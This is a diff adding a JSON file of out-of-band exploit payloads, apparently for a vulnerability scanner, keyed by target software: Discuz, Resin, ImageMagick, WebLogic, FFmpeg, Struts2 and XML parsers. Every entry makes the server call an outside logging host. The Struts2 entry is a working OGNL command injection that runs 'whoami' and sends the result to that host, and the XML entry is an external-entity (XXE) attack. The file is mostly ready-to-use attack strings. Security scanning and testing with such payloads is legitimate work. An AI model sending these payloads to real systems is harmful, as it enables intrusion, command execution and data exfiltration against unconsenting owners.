@@ -1,0 +1,21 @@
+{
+  "discuz": [
+    "example.com/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://ip.port.butian.eyes.sh/x.jpg[/img]&formhash=x"
+  ],
+  "resin中间件": [
+    "example.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.port.butian.eyes.sh/ssrf"
+  ],
+  "ImageMagick插件": [
+    "push graphic-context\nviewbox 0 0 640 480\nfill 'url(http://ip.port.butian.eyes.sh)'",
+    "pop graphic-context"
+  ],
+  "Weblogic中间件": [
+    "example.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://ip.port.butian.eyes.sh/test&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search"
+  ],
+  "FFMpeg插件": ["#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nconcat:http://ip.port.butian.eyes.sh\n#EXT-X-ENDLIST"
+  ],
+  "Struts2中间件": [
+    "xx.action?redirect:http://ip.port.butian.eyes.sh/%25{3*4}xx.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d\"http://ip.port.butian.eyes.sh/result%3d\".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod(\"GET\"),%23http.connect(),%23http.getInputStream()}"
+  ],
+  "XML实体": ["<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n<!ENTITY % remote SYSTEM \"http://ip.port.butian.eyes.sh/xxe_test\">\n%remote;]>\n<root/>"]
+}
